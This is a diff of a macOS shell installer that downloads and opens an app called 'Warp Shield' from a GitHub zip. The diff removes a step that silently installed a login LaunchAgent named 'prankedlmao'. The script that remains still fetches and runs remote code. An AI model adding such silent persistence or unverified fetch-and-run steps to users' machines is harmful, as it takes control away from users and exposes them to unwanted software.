@@ -2,9 +2,7 @@
 set -euo pipefail
 
 # --- Config ---
-ZIP_URL="ZIP_URL="https://raw.githubusercontent.com/44sk/expert-disco/main/Warp%20Shield.zip"
-
-"
+ZIP_URL="https://raw.githubusercontent.com/44sk/expert-disco/main/Warp%20Shield.zip"
 TMPDIR="$(mktemp -d)"
 APP_NAME="Warp Shield.app"
 
@@ -53,33 +51,6 @@ chmod +x "$DEST/Contents/MacOS/"* 2>/dev/null || true
 # --- Open the app ---
 open "$DEST"
 
-# --- LaunchAgent setup ---
-PLIST_SRC="$DEST/Contents/Resources/com.Warpshield.prankedlmao.plist"
-PLIST_DST="$HOME/Library/LaunchAgents/com.Warpshield.prankedlmao.plist"
-
-mkdir -p "$HOME/Library/LaunchAgents"
-
-# --- Copy plist ---
-cp "$PLIST_SRC" "$PLIST_DST"
-
-# --- Set permissions ---
-chmod 644 "$PLIST_DST"
-chown "$USER":staff "$PLIST_DST"
-
-# --- Validate plist ---
-plutil -lint "$PLIST_DST"
-
-# --- Unload old agent if any, then load ---
-launchctl bootout gui/$(id -u) "$PLIST_DST" 2>/dev/null || true
-launchctl bootstrap gui/$(id -u) "$PLIST_DST"
-
-# --- Check if running ---
-if launchctl list | grep -q prankedlmao; then
-    echo "LaunchAgent loaded successfully!"
-else
-    echo "LaunchAgent did not load."
-fi
-
 # --- Final message ---
 echo
-echo "Thanks for downloading ;)"
+echo "Thanks for downloading :)"
